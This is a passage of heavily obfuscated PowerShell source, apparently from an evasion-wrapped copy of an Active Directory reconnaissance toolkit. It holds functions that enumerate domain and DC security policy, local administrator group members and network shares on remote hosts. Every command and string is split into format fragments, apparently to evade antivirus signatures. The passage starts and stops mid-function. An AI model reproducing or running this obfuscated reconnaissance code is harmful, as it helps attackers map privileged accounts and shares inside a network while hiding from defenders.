                            if (${_}."sAmAccO`Un`TTyPE" -ne ("{0}{1}" -f'805',("{1}{0}" -f'6368','30'))) {
                                ${m`emb`eR`Is`GrouP} = ${T`Rue}
                            }
                            else {
                                ${mE`MBE`Ri`SGrOUp} = ${fa`lsE}
                            }

                            if (${_}."sAMaCco`UnT`Name") {
                                
                                ${M`EM`BerN`AMe} = ${_}."s`Am`Ac`cOu`NTNaME"
                            }
                            else {
                                
                                try {
                                    ${MeM`BeRNA`mE} = &("{1}{2}{4}{3}{0}" -f ("{1}{0}" -f'e','Nam'),'Co','n',("{1}{0}"-f'o','idT'),("{1}{0}"-f 'ert-S','v')) ${_}."CN"
                                }
                                catch {
                                    
                                    ${meMber`N`A`mE} = ${_}."Cn"
                                }
                            }

                            ${g`pOC`o`mpUteRaDm`IN} = &("{1}{2}{0}" -f'ct',("{0}{1}" -f'New-','O'),'bje') ("{0}{1}" -f("{1}{2}{0}"-f'ec','PSOb','j'),'t')
                            ${gPO`Com`Pu`T`eradM`In} | &("{0}{2}{1}"-f ("{0}{1}" -f 'Add','-M'),'er','emb') ("{0}{1}{2}"-f'Not',("{0}{1}{2}"-f'ep','rope','r'),'ty') ("{2}{3}{1}{0}"-f 'ame','N','C',("{1}{2}{0}" -f'r','o','mpute')) ${co`MPute`R`Name}
                            ${g`p`O`CoMp`UTEr`AdmIN} | &("{2}{1}{0}"-f'er',("{0}{1}"-f 'd-Mem','b'),'Ad') ("{1}{0}{3}{2}" -f 'e','Not',("{1}{0}" -f 'rty','pe'),'pro') 'OU' ${ou}
                            ${GPO`COMpUteR`Ad`m`iN} | &("{2}{3}{0}{1}"-f("{1}{0}"-f'Memb','d-'),'er','A','d') ("{3}{1}{2}{0}" -f'rty',("{0}{1}"-f'otep','ro'),'pe','N') ("{4}{1}{2}{0}{3}" -f'Nam','OD',("{0}{1}{2}" -f'is','pla','y'),'e','GP') ${g`po}."gPO`DIS`PLAYN`AmE"
                            ${GPo`c`omPUTErADm`iN} | &("{0}{1}{2}{3}"-f'A',("{1}{0}" -f'd-Me','d'),'m','ber') ("{3}{0}{1}{2}"-f ("{0}{1}"-f 'ep','ro'),("{0}{1}" -f'pe','rt'),'y','Not') ("{2}{1}{0}" -f 'h','t',("{1}{0}"-f'a','GPOP')) ${G`po}."gpo`pAtH"
                            ${Gp`OCO`mPuTeRADM`in} | &("{0}{1}{2}" -f 'A',("{0}{1}"-f 'dd-','Mem'),'ber') ("{1}{0}{2}" -f ("{0}{1}{2}"-f'p','rop','ert'),("{0}{1}"-f'Not','e'),'y') ("{2}{1}{0}"-f ("{0}{1}"-f 'tNa','me'),'jec','Ob') ${me`M`BErna`ME}
                            ${G`p`O`CompUTERAD`MIN} | &("{2}{1}{0}"-f("{1}{0}{2}"-f'-Membe','d','r'),'d','A') ("{1}{3}{2}{0}" -f 'rty','Not','pe',("{1}{0}"-f'ro','ep')) ("{2}{1}{0}" -f'DN',("{1}{0}"-f 't','jec'),'Ob') ${MEm`BE`RdN}
                            ${GPo`cOM`pUT`e`RADMIn} | &("{1}{2}{0}"-f ("{1}{0}" -f 'ber','em'),("{1}{0}"-f'-','Add'),'M') ("{2}{1}{0}" -f 'ty',("{1}{0}" -f 'oper','r'),("{1}{0}"-f 'ep','Not')) ("{1}{2}{0}" -f 'ID',("{1}{0}" -f 'bject','O'),'S') ${_}."o`BJ`EcTSid"
                            ${gpocOMP`U`TEr`ADM`IN} | &("{1}{2}{0}" -f'ber','Add',("{1}{0}"-f'em','-M')) ("{0}{3}{1}{2}" -f 'No','r','ty',("{1}{0}{2}" -f'eprop','t','e')) ("{0}{2}{1}" -f 'Is','p',("{1}{0}"-f'u','Gro')) ${mem`B`E`Ri`SGrOup}
                            ${G`pOCo`M`PuTERAdmin} 
                        }
                    }
                }
            }
        }
    }
}


function GeT-D`Om`AIn`po`licY {


    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet({"{1}{0}"-f ("{0}{1}" -f 'm','ain'),'Do'},"DC")]
        ${SOU`RCe} =("{1}{0}" -f ("{0}{1}" -f 'mai','n'),'Do'),

        [String]
        ${do`MAin},

        [String]
        ${DomaiNC`ont`ROl`L`eR},

        [Switch]
        ${ReSO`lVESi`Ds},

        [Switch]
        ${uSE`psDR`iVe}
    )

    if(${S`Ou`RCe} -eq ("{1}{0}" -f("{1}{0}"-f 'main','o'),'D')) {
        
        ${G`Po} = &("{1}{0}{2}"-f ("{1}{0}" -f'etG','N'),("{1}{0}"-f't-','Ge'),'PO') -Domain ${D`oMain} -DomainController ${D`oMai`NcON`TroLL`Er} -GPOname "{31B2F340-016D-11D2-945F-00C04FB984F9}"
        
        if(${G`Po}) {
            
            ${G`pTTm`plpa`TH} = ${g`pO}."G`Pcf`ILES`y`spATh" + ((("{3}{5}{6}{0}{9}{7}{8}{4}{10}{11}{2}{1}"-f ("{0}{1}" -f'fXF','Wi'),'nf',("{0}{1}"-f'ptTmpl.','i'),'fX','i',("{0}{1}" -f 'FMA','CH'),("{1}{2}{0}{3}"-f 'so','INE','fXFMicro','ft'),'o',("{1}{2}{0}{3}" -f 'XFSecE','ws NT','f','d'),'nd','tf','XFG')).("{0}{1}" -f 'rep',("{0}{1}" -f 'lAC','e'))."iN`VoKE"('fXF','\'))

            ${p`Ar`Se`ARGs} =  @{
                ("{1}{2}{0}" -f'ath',("{1}{0}"-f 'Tmp','Gpt'),'lP') = ${gpTtm`PLP`A`TH}
                ("{1}{0}{2}" -f ("{0}{1}" -f'PSD','r'),'Use','ive') = ${use`pSD`RivE}
            }

            
            &("{1}{2}{0}" -f'pl','G',("{1}{0}{2}"-f 'pt','et-G','Tm')) @ParseArgs
        }

    }
    elseif(${sO`U`Rce} -eq "DC") {
        
        ${G`Po} = &("{1}{0}{2}{3}" -f ("{0}{1}" -f'e','t-Ne'),'G','t','GPO') -Domain ${d`O`MAIN} -DomainController ${d`oMAI`NcontroL`LeR} -GPOname "{6AC1786C-016F-11D2-945F-00C04FB984F9}"

        if(${G`Po}) {
            
            ${gpT`Tmp`L`Path} = ${G`PO}."gPCfI`le`sYSPAth" + ((("{9}{2}{11}{1}{5}{6}{7}{10}{3}{8}{4}{0}"-f ("{2}{0}{1}"-f 'l.i','nf','OGptTmp'),'OM','yO',("{0}{1}"-f'd','ows'),("{0}{1}"-f'E','dit0y'),("{0}{1}"-f'i','cro'),("{1}{2}{0}" -f'ft0yO','s','o'),'W',("{0}{1}" -f ' NT0yO','Sec'),'0','in',("{1}{0}{2}" -f'E','MACHIN','0y')))."r`eplAcE"('0yO',[StRiNG][chAr]92))

            ${pars`e`AR`gS} =  @{
                ("{0}{3}{1}{2}"-f'Gp','lPa','th',("{1}{0}" -f'p','tTm')) = ${gPttM`p`l`PAth}
                ("{0}{1}{2}" -f("{1}{0}" -f 'ePSD','Us'),'r','ive') = ${us`EpSd`Rive}
            }

            
            &("{0}{2}{3}{1}"-f 'Get',("{0}{1}" -f 't','Tmpl'),'-G','p') @ParseArgs | &("{0}{3}{2}{1}"-f'F',("{0}{1}" -f 'b','ject'),'h-O',("{1}{0}"-f 'reac','o')) {
                if(${rEsOl`V`es`ids}) {
                    
                    ${P`Ol`icY} = &("{3}{0}{2}{1}"-f 'b','t','jec',("{0}{1}"-f 'N','ew-O')) ("{2}{0}{1}"-f ("{1}{0}" -f'Obje','S'),'ct','P')
                    ${_}."PSo`BJECT"."PRop`ErTI`ES" | &("{0}{1}{2}{3}"-f'F',("{2}{0}{1}" -f'ch-','Ob','orea'),'j','ect') {
                        if( ${_}."n`Ame" -eq ("{4}{0}{3}{1}{2}"-f'e',("{1}{0}"-f'h','Rig'),'ts','ge',("{1}{0}"-f'ivil','Pr'))) {

                            ${PRiviL`eGeR`IgH`Ts} = &("{1}{2}{0}" -f 'ct',("{1}{0}" -f '-','New'),("{1}{0}"-f'e','Obj')) ("{0}{1}"-f 'PS',("{0}{1}"-f'Objec','t'))
                            
                            
                            ${_}."va`LuE"."Pso`Bje`cT"."p`R`OPErti`ES" | &("{0}{3}{1}{2}" -f ("{0}{1}"-f'For','eac'),("{0}{1}" -f 'b','jec'),'t','h-O') {

                                ${SI`DS} = ${_}."vAl`UE" | &("{3}{2}{0}{1}"-f("{0}{1}{2}" -f'ch-O','bj','e'),'ct','a',("{0}{1}" -f 'For','e')) {
                                    try {
                                        if(${_} -isnot [System.Array]) { 
                                            &("{2}{3}{4}{1}{0}" -f'me',("{0}{1}{2}"-f'SidT','oN','a'),'C',("{0}{2}{1}"-f 'o','ert','nv'),'-') ${_} 
                                        }
                                        else {
                                            ${_} | &("{2}{3}{0}{1}"-f("{2}{1}{0}" -f 'h-Objec','c','a'),'t','For','e') { &("{2}{1}{3}{4}{0}" -f("{0}{1}" -f'Na','me'),("{0}{2}{1}"-f'on','t-Si','ver'),'C','d','To') ${_} }
                                        }
                                    }
                                    catch {
                                        &("{0}{1}{2}" -f("{0}{1}"-f'Write','-'),'Deb','ug') (("{1}{0}" -f'or','Err')+' '+("{0}{1}" -f're','so')+'l'+("{1}{0}" -f'ng ','vi')+'SI'+'D '+': '+"$_")
                                    }
                                }

                                ${PR`iVileG`ErIGH`Ts} | &("{2}{1}{0}" -f'r',("{1}{0}" -f 'mbe','e'),("{1}{0}" -f'-M','Add')) ("{1}{3}{2}{0}"-f 'y','N','rt',("{0}{1}" -f 'ote','prope')) ${_}."Na`me" ${sI`DS}
                            }

                            ${pO`liCY} | &("{3}{2}{0}{1}" -f 'm','ber','-Me','Add') ("{0}{2}{1}"-f("{0}{2}{1}"-f'N','ope','otepr'),'y','rt') ("{1}{2}{0}{3}"-f ("{1}{0}" -f'ge','le'),'Pr','ivi',("{0}{1}"-f 'Ri','ghts')) ${PriV`Il`e`g`ErIgHTS}
                        }
                        else {
                            ${P`OL`ICY} | &("{2}{1}{0}"-f 'r','e',("{0}{2}{1}"-f'A','b','dd-Mem')) ("{1}{2}{0}"-f 'y',("{1}{0}" -f'ep','Not'),("{1}{0}" -f't','roper')) ${_}."N`AmE" ${_}."VAL`Ue"
                        }
                    }
                    ${pol`IcY}
                }
                else { ${_} }
            }
        }
    }
}











function GET-nE`Tl`OC`Al`GRo`UP {


    [CmdletBinding()]
    param(
        [Parameter(vALUefroMPIpElIne=${T`RUE})]
        [Alias({"{1}{0}"-f ("{0}{1}"-f 'ostNa','me'),'H'})]
        [String]
        ${Co`M`PuT`eRNaMe} = ("{1}{0}{2}" -f ("{0}{2}{1}" -f'oc','lho','a'),'l','st'),

        [ValidateScript({&("{0}{2}{1}" -f 'Te','th',("{0}{1}" -f's','t-Pa')) -Path ${_} })]
        [Alias({"{0}{1}"-f 'Ho',{"{1}{2}{0}" -f'List','s','t'}})]
        [String]
        ${C`OMPutEr`File},

        [String]
        ${GrouP`N`AME} = ("{2}{0}{3}{1}"-f'min',("{1}{0}"-f'ors','t'),'Ad',("{1}{0}"-f 'tra','is')),

        [Switch]
        ${LIS`TGRO`U`ps},

        [Switch]
        ${rEcU`R`SE}
    )

    begin {
        if ((-not ${liS`TgRo`U`PS}) -and (-not ${GroUp`NA`mE})) {
            
            ${O`BJs`ID} = &("{2}{1}{0}"-f'ct','bje',("{0}{1}"-f'New-','O')) ("{6}{5}{3}{4}{0}{7}{1}{2}"-f 'Se',("{2}{1}{0}{3}" -f'en','d','rityI','t'),("{0}{1}" -f 'if','ier'),("{1}{0}" -f 'nci','i'),("{1}{0}" -f '.','pal'),("{0}{2}{3}{1}" -f'Se','Pr','cur','ity.'),("{1}{0}" -f'stem.','Sy'),'cu')(("{0}{3}{2}{1}"-f 'S','4','-54',("{1}{0}{2}"-f'-','-1-5','32')))
            ${Obj`GRO`Up} = ${O`BJsID}."T`RaN`slatE"( [System.Security.Principal.NTAccount])
            ${G`R`Oupna`mE} = (${O`B`JgrO`Up}."VAL`Ue").("{1}{0}"-f ("{0}{1}"-f'pl','it'),'S')."i`NVOKE"('\')[1]
        }
    }
    process {

        ${sErv`e`Rs} = @()

        
        if(${c`OMP`UtE`RFiLe}) {
            ${SErv`ErS} = &("{0}{3}{1}{2}" -f'Get','nte','nt','-Co') -Path ${cOmpuT`er`FI`LE}
        }
        else {
            
            ${se`R`VERS} += &("{2}{1}{0}" -f("{0}{1}"-f 'meF','ield'),'-Na','Get') -Object ${cO`MPU`TeRnaME}
        }

        
        
        ForEach(${se`R`VeR} in ${SeRVE`RS}) {
            try {
                if(${LI`s`Tg`RouPs}) {
                    
                    ${coM`PUt`Er} = [ADSI]"WinNT://$Server,computer"

                    ${CoM`PUT`Er}."P`SbASE"."CHI`Ld`REn" | &("{3}{0}{1}{2}"-f("{1}{0}"-f 'b','re-O'),'j','ect','Whe') { ${_}."pS`BASe"."s`chEMaCl`A`sSnA`mE" -eq ("{0}{1}" -f 'gro','up') } | &("{3}{1}{2}{0}" -f("{2}{0}{1}"-f 'jec','t','ch-Ob'),'o','rEa','F') {
                        ${gR`ouP} = &("{2}{1}{0}" -f("{1}{0}"-f 'ect','bj'),'-O','New') ("{2}{1}{0}"-f ("{1}{0}"-f 'ject','b'),'O','PS')
                        ${G`Ro`Up} | &("{1}{2}{0}"-f ("{0}{1}{2}"-f'Memb','e','r'),'A','dd-') ("{1}{2}{0}{3}"-f 'op','Not','epr',("{0}{1}" -f'ert','y')) ("{2}{0}{1}" -f'rve','r','Se') ${SeRV`eR}
                        ${gRO`UP} | &("{2}{1}{0}"-f ("{1}{0}"-f 'r','mbe'),("{0}{1}"-f 'd-M','e'),'Ad') ("{1}{2}{0}" -f'y',("{1}{0}"-f'tep','No'),("{0}{1}" -f 'ro','pert')) ("{0}{1}" -f ("{0}{1}"-f'Gro','u'),'p') (${_}."N`Ame"[0])
                        ${GRO`UP} | &("{1}{2}{0}" -f ("{1}{0}" -f 'ber','m'),'Add','-Me') ("{1}{3}{0}{2}"-f ("{1}{0}"-f'rop','p'),'Not',("{1}{0}" -f'ty','er'),'e') 'SID' ((&("{0}{2}{1}"-f 'N','t',("{2}{0}{1}"-f '-Obje','c','ew')) ("{5}{6}{0}{7}{4}{2}{1}{3}" -f("{0}{1}{2}"-f'r','inc','ip'),'y',("{1}{0}" -f't','uri'),("{1}{2}{0}" -f 'ier','Id','entif'),("{1}{0}" -f '.Sec','l'),("{2}{1}{0}"-f 'em','yst','S'),("{3}{2}{1}{0}"-f'rity.P','u','Sec','.'),'a') ${_}."Ob`JectsId"[0],0)."VA`Lue")
                        ${gr`oUP} | &("{2}{1}{0}"-f ("{1}{0}" -f'ber','em'),("{1}{0}" -f '-M','dd'),'A') ("{0}{1}{2}"-f("{0}{1}"-f'No','te'),("{0}{1}" -f'pr','ope'),'rty') ("{1}{0}{2}" -f 'scr','De',("{2}{1}{0}"-f'on','i','ipt')) (${_}."deSCRip`Ti`on"[0])
                        ${gR`OuP}
                    }
                }
                else {
                    
                    ${meM`B`ErS} = @($([ADSI]"WinNT://$Server/$GroupName")."pS`Base"."I`N`VOKE"(("{0}{1}" -f ("{0}{1}"-f'M','emb'),'ers')))

                    ${M`eM`BeRs} | &("{1}{4}{3}{0}{2}" -f'ec',("{1}{2}{0}" -f'ach','For','E'),'t','j','-Ob') {

                        ${M`eMber} = &("{1}{0}{2}" -f 'ew-','N',("{1}{0}" -f 'ct','Obje')) ("{1}{2}{0}"-f ("{1}{0}" -f 'ect','bj'),'P','SO')
                        ${mEM`B`Er} | &("{3}{2}{0}{1}"-f 'emb','er','d-M','Ad') ("{0}{3}{2}{1}" -f 'No','ty',("{0}{2}{1}"-f 'pro','er','p'),'te') ("{0}{1}" -f'Se',("{0}{1}" -f 'r','ver')) ${Se`RVer}

                        ${A`Ds`pATH} = (${_}.("{0}{1}"-f 'G',("{2}{1}{0}" -f'ype','tT','e'))."InvO`kE"().("{2}{0}{1}"-f'n',("{2}{3}{1}{0}" -f'r','e','voke','Memb'),'I')."iN`Vo`kE"(("{1}{0}"-f("{1}{0}"-f'h','pat'),'Ads'), ("{0}{1}{2}{3}" -f'G','e',("{0}{1}" -f 't','Pro'),("{0}{1}"-f'p','erty')), ${n`UlL}, ${_}, ${N`Ull})).("{1}{0}" -f 'ce',("{0}{1}"-f'Re','pla'))."in`VokE"(("{0}{1}{2}" -f 'W',("{1}{0}"-f 'nNT','i'),'://'), '')

                        
                        ${N`AMe} = &("{1}{2}{4}{0}{3}{5}"-f ("{1}{0}" -f 't','NT4'),'Co','nve',("{2}{1}{0}"-f 'noni','a','oC'),'rt-','cal') -ObjectName ${aD`spa`TH}
                        if(${Na`Me}) {
                            ${f`QDN} = ${N`Ame}.("{1}{0}" -f 't',("{0}{1}"-f 's','pli'))."I`NVoke"("/")[0]
                            ${OBjNA`Me} = ${aDsP`A`Th}.("{0}{1}"-f 's',("{0}{1}"-f'pl','it'))."IN`Vo`Ke"("/")[-1]
                            ${na`Me} = "$FQDN/$ObjName"
                            ${ISd`omA`IN} = ${t`Rue}
                        }
                        else {
                            ${na`ME} = ${ad`sPaTH}
                            ${i`SD`oMain} = ${FAL`sE}
                        }

                        ${me`mBEr} | &("{0}{2}{1}" -f("{0}{1}"-f 'A','dd-'),("{0}{1}" -f'm','ber'),'Me') ("{2}{1}{0}{3}" -f 'p','e','Not',("{0}{1}"-f 'r','operty')) ("{2}{1}{0}{3}" -f'tN',("{1}{0}" -f 'n','cou'),'Ac','ame') ${na`Me}

                        
                        ${M`embEr} | &("{1}{2}{0}" -f'er','Ad',("{0}{1}"-f 'd-M','emb')) ("{2}{1}{0}" -f'rty',("{1}{0}"-f'e','prop'),("{0}{1}"-f'N','ote')) 'SID' ((&("{1}{2}{0}"-f("{0}{1}" -f 'je','ct'),("{0}{1}" -f 'New-','O'),'b') ("{3}{7}{0}{4}{1}{5}{6}{2}"-f ("{0}{1}"-f 'c','ipal'),("{0}{2}{1}{3}" -f 'curit','Ide','y','n'),'r',("{0}{1}{2}"-f'Sy','s','tem.S'),'.Se',("{1}{0}"-f'fi','ti'),'e',("{2}{1}{0}"-f'n','ity.Pri','ecur'))(${_}.("{1}{0}"-f'pe',("{0}{1}" -f 'GetT','y'))."INv`oke"().("{2}{1}{0}" -f'er','b',("{0}{1}{2}"-f 'In','vokeM','em'))."inv`O`KE"(("{1}{2}{0}"-f 'SID','Obj','ect'), ("{3}{0}{1}{2}"-f'o',("{1}{0}"-f 'ert','p'),'y',("{0}{1}"-f'Get','Pr')), ${nu`lL}, ${_}, ${n`UlL}),0))."vAl`UE")

                        
                        
                        ${me`mb`eR} | &("{0}{2}{1}"-f("{0}{1}"-f'Add','-M'),'r',("{0}{1}"-f'e','mbe')) ("{1}{2}{3}{0}"-f ("{1}{0}" -f 'ty','per'),'Not','epr','o') ("{2}{1}{0}"-f'ed','abl','Dis') $( if(-not ${isdo`Ma`IN}) { try { ${_}.("{1}{0}"-f 'pe',("{1}{0}" -f 'y','GetT'))."i`NV`okE"().("{2}{3}{0}{1}"-f("{0}{1}" -f 'eMemb','e'),'r','I',("{1}{0}" -f'vok','n'))."INv`oke"(("{0}{1}{2}"-f("{1}{2}{0}{3}"-f 'coun','A','c','tDis'),("{1}{0}" -f 'le','ab'),'d'), ("{1}{2}{0}"-f'rty','Get',("{1}{0}"-f'e','Prop')), ${N`UlL}, ${_}, ${Nu`ll}) } catch { ("{1}{0}"-f'R',("{0}{1}" -f 'E','RRO')) } } else { ${F`A`lsE} } )

                        
                        ${i`sgr`oUp} = (${_}.("{1}{0}{2}"-f 'p',("{0}{1}" -f 'Get','Ty'),'e')."INV`OkE"().("{3}{0}{2}{1}" -f ("{1}{0}" -f 'k','nvo'),'ber',("{1}{0}"-f'em','eM'),'I')."iN`VO`KE"(("{1}{0}" -f'ss','Cla'), ("{2}{1}{3}{0}" -f 'y','P','Get',("{0}{1}" -f'roper','t')), ${n`ULl}, ${_}, ${N`UlL}) -eq ("{0}{1}" -f'gr','oup'))
                        ${MeMB`eR} | &("{2}{0}{1}" -f("{1}{0}" -f'm','d-Me'),'ber','Ad') ("{2}{0}{1}{3}"-f("{0}{2}{1}"-f'ot','per','epro'),'t','N','y') ("{0}{1}" -f ("{1}{0}" -f 'r','IsG'),'oup') ${isg`R`OUP}
                        ${M`e`mbER} | &("{2}{1}{0}" -f 'ber',("{0}{1}" -f '-Me','m'),'Add') ("{2}{1}{0}"-f'rty','pe',("{0}{1}" -f'No','tepro')) ("{2}{0}{1}" -f'i','n',("{0}{1}"-f 'IsDom','a')) ${IS`DO`mAiN}
                        if(${IS`GrOuP}) {
                            ${me`mB`eR} | &("{1}{0}{2}"-f'M',("{1}{0}" -f 'd-','Ad'),("{0}{1}"-f'embe','r')) ("{1}{0}{2}"-f ("{0}{1}{2}"-f 'rope','r','t'),("{0}{1}"-f'No','tep'),'y') ("{0}{1}" -f'Las',("{0}{1}"-f 'tLo','gin')) ""
                        }
                        else {
                            try {
                                ${M`eMb`er} | &("{2}{1}{0}" -f ("{1}{0}" -f 'Member','-'),'d','Ad') ("{0}{1}{2}" -f ("{3}{0}{1}{2}"-f 'tepr','op','e','No'),'r','ty') ("{0}{2}{1}"-f 'Las','gin','tLo') ( ${_}.("{1}{0}{2}" -f ("{0}{1}"-f'etT','y'),'G','pe')."In`VoKE"().("{1}{0}{2}"-f("{1}{0}"-f'ke','nvo'),'I',("{1}{0}"-f 'er','Memb'))."INV`o`kE"(("{1}{2}{0}" -f("{1}{0}"-f 'in','Log'),'La','st'), ("{0}{1}{3}{2}" -f("{1}{0}" -f'Pr','Get'),'op','rty','e'), ${NU`LL}, ${_}, ${NU`ll}))
                            }
                            catch {
                                ${Me`m`BEr} | &("{1}{3}{2}{0}"-f("{0}{1}"-f'm','ber'),'Ad','Me','d-') ("{3}{1}{2}{0}" -f 'rty','op','e',("{2}{1}{0}"-f 'pr','ote','N')) ("{1}{2}{0}"-f'n',("{1}{0}" -f 't','Las'),("{1}{0}"-f'gi','Lo')) ""
                            }
                        }
                        ${M`eMb`Er}

                        
                        
                        if(${R`e`cUrse} -and ${isDO`M`A`In} -and ${Is`groUp}) {

                            ${f`QDn} = ${na`ME}.("{1}{0}"-f 'lit','sp')."iNv`OkE"("/")[0]
                            ${Gr`oUPN`AmE} = ${n`Ame}.("{0}{1}"-f'spl','it')."inv`OKE"("/")[1].("{1}{0}" -f 'im','tr')."I`NvO`kE"()

                            &("{2}{4}{1}{0}{3}" -f'ro','etG',("{0}{1}"-f'G','et-'),("{1}{0}{2}"-f'emb','upM','er'),'N') -GroupName ${Gro`UP`N`Ame} -Domain ${F`QDN} -FullData -Recurse | &("{0}{1}{3}{2}"-f 'For','Ea',("{1}{0}"-f'ect','bj'),("{0}{1}"-f'ch','-O')) {

                                ${M`EMBeR} = &("{0}{3}{1}{2}"-f 'N',("{0}{1}" -f'w','-Objec'),'t','e') ("{1}{2}{0}"-f't',("{0}{1}" -f 'PSOb','je'),'c')
                                ${m`EMBEr} | &("{1}{2}{0}"-f'r','Ad',("{0}{2}{1}"-f'd-M','be','em')) ("{0}{1}{2}{3}"-f'No','tep',("{0}{1}"-f 'roper','t'),'y') ("{0}{1}{2}" -f'Se','rv','er') "$FQDN/$($_.GroupName)"

                                ${me`MBe`RDN} = ${_}."Dis`T`iNgu`isheDN`Ame"
                                
                                ${meM`Be`R`doMA`In} = ${ME`Mb`e`RDn}.("{0}{1}{2}" -f ("{1}{0}"-f'St','sub'),'rin','g')."I`NVoKe"(${M`ember`dN}.("{2}{1}{0}"-f'f','exO','Ind')."Inv`O`Ke"("DC=")) -replace 'DC=','' -replace ',','.'

                                if (${_}."SamaCc`o`Un`TTYPe" -ne ("{0}{2}{1}"-f '805','368','306')) {
                                    ${mEM`B`erI`sGrouP} = ${Tr`Ue}
                                }
                                else {
                                    ${meMb`E`RiSGrO`Up} = ${F`A`lsE}
                                }

                                if (${_}."Sa`m`ACco`Unt`NaMe") {
                                    
                                    ${me`MbE`RN`AME} = ${_}."SA`Ma`cCO`UntnaMe"
                                }
                                else {
                                    try {
                                        
                                        try {
                                            ${meMbeR`N`AMe} = &("{1}{0}{3}{2}"-f'v','Con','e',("{0}{1}{2}"-f 'e','rt-SidToNa','m')) ${_}."Cn"
                                        }
                                        catch {
                                            
                                            ${mEMbe`Rna`me} = ${_}."CN"
                                        }
                                    }
                                    catch {
                                        &("{1}{0}{2}{3}" -f'e-D',("{0}{1}"-f'W','rit'),'eb','ug') (("{0}{1}"-f'Erro','r')+' '+'res'+("{1}{0}" -f'n','olvi')+'g '+'SID'+' '+': '+"$_")
                                    }
                                }

                                ${MeM`B`er} | &("{0}{1}{2}"-f("{1}{0}" -f 'M','Add-'),'em','ber') ("{1}{2}{0}{3}"-f'rt',("{0}{1}"-f'N','otepr'),'ope','y') ("{1}{3}{2}{0}" -f 'me','A','tNa',("{0}{1}" -f 'c','coun')) "$MemberDomain/$MemberName"
                                ${meMb`ER} | &("{0}{1}{2}" -f 'Ad','d-',("{0}{1}"-f 'Mem','ber')) ("{1}{0}{2}"-f("{0}{1}" -f 'pr','oper'),("{1}{0}"-f'te','No'),'ty') 'SID' ${_}."ObJEC`T`Sid"
                                ${me`MBeR} | &("{2}{0}{1}" -f 'dd-',("{1}{0}" -f'ber','Mem'),'A') ("{1}{2}{0}" -f'ty',("{0}{1}"-f'N','otep'),("{0}{1}"-f 'r','oper')) ("{1}{2}{0}"-f'ed',("{1}{0}" -f 'sa','Di'),'bl') ${FA`lsE}
                                ${MeM`B`er} | &("{0}{1}{2}"-f("{1}{0}"-f '-','Add'),("{1}{0}"-f'mbe','Me'),'r') ("{1}{0}{2}" -f 'pr',("{1}{0}" -f'e','Not'),("{1}{0}"-f 'ty','oper')) ("{2}{1}{0}"-f ("{0}{1}"-f 'ro','up'),'sG','I') ${m`e`mb`ErIs`GROuP}
                                ${meM`BeR} | &("{1}{0}{2}{3}" -f '-Me','Add','m','ber') ("{0}{2}{3}{1}" -f 'Not',("{0}{1}"-f 'roper','ty'),'e','p') ("{0}{2}{1}" -f ("{0}{1}"-f'I','sDo'),'n','mai') ${Tr`UE}
                                ${mE`M`BER} | &("{1}{2}{0}"-f("{0}{1}" -f 'M','ember'),'Add','-') ("{1}{0}{2}" -f ("{1}{0}" -f 'pert','epro'),'Not','y') ("{2}{1}{0}" -f 'gin','o',("{0}{1}"-f 'Last','L')) ''
                                ${Me`m`BeR}
                            }
                        }
                    }
                }
            }
            catch {
                &("{1}{2}{0}"-f'g',("{2}{1}{0}"-f 'e-Wa','it','Wr'),("{1}{0}" -f 'nin','r')) ('[!]'+' '+'E'+'rr'+("{0}{1}"-f'or:',' ')+"$_")
            }
        }
    }
}


function GE`T-N`ET`S`HAre {


    [CmdletBinding()]
    param(
        [Parameter(VALuEfrompiPelINE=${T`RUe})]
        [Alias({"{0}{2}{1}"-f 'Ho','me',{"{0}{1}"-f's','tNa'}})]
        [String]
        ${Comput`Erna`Me} = ("{1}{2}{0}" -f't','l',("{0}{2}{1}"-f'o','alhos','c'))
    )

    begin {
        if (${ps`B`oU`NdPara`M`EtERs}[("{0}{1}" -f'Deb','ug')]) {
            ${D`EBU`gPrEF`Er`EncE} = ("{1}{0}" -f'ue',("{0}{1}" -f 'Co','ntin'))
        }
    }

    process {

        
        ${C`oMput`ern`A`mE} = &("{1}{2}{0}" -f ("{0}{1}{2}"-f 'Na','meF','ield'),'G','et-') -Object ${C`o`MpuTeR`N`Ame}

        
        ${qu`ErylEV`El} = 1
        ${pTR`iNFo} =   ${s`QG}::"Ze`Ro"
        ${ent`R`IEsR`ead} = 0
        ${TO`TaLre`Ad} = 0
        ${reS`UMeH`AN`DlE} = 0

        
        ${REs`U`lT} = ${neTa`pi32}::"NEtSHarEE`N`Um"."invO`ke"(${C`O`mPUTE`RnAMe}, ${QuER`Yl`EVEl}, [ref]${PTr`I`Nfo}, -1, [ref]${EN`TrIEs`R`EAD}, [ref]${T`OT`Alre`Ad}, [ref]${RESUm`ehand`le})

        
        ${OF`Fs`ET} = ${Pt`RIn`Fo}.("{1}{0}{2}" -f 'Int','To','64')."INV`Oke"()

        &("{3}{0}{2}{1}"-f ("{1}{0}" -f'D','te-'),'g','ebu','Wri') ('G'+("{1}{2}{0}"-f'S','e','t-Net')+("{0}{1}" -f'ha','re ')+("{1}{0}"-f 't:','resul')+' '+"$Result")

        
        if ((${r`esU`Lt} -eq 0) -and (${oF`F`Set} -gt 0)) {

            
            ${InCreM`E`Nt} = ${shA`R`E_inF`o`_1}::("{0}{1}" -f("{1}{0}"-f'etS','G'),'ize')."inV`okE"()

            
            for (${I} = 0; (${I} -lt ${e`NTriE`srE`AD}); ${I}++) {
                
                
                ${n`e`w`INtPtr} = &("{1}{2}{0}"-f'ct',("{0}{1}"-f 'N','ew-Ob'),'je') ("{0}{1}{2}"-f ("{0}{1}"-f'Sy','stem'),("{1}{0}" -f 'ntp','.I'),'tr') -ArgumentList ${oF`Fset}
                ${iN`FO} = ${nE`w`InTptR} -as ${SharE_I`N`F`O_1}
                
                ${iN`Fo} | &("{0}{2}{1}{3}"-f 'S',("{2}{1}{0}" -f'Objec','ect-','l'),'e','t') ('*')
                ${oF`F`SeT} = ${N`EWi`NTptr}.("{1}{0}" -f("{0}{1}"-f'Int6','4'),'To')."I`NvOKe"()
                ${OF`FsET} += ${I`NcremE`NT}
            }

            
            ${n`UlL} = ${N`etAPI`32}::("{0}{2}{3}{1}"-f'N',("{0}{1}" -f'erFre','e'),("{0}{1}" -f 'e','tAp'),("{1}{0}" -f'f','iBuf'))."I`NvOkE"(${p`T`RiNFO})
        }
        else
        {
            switch (${rE`SU`lt}) {
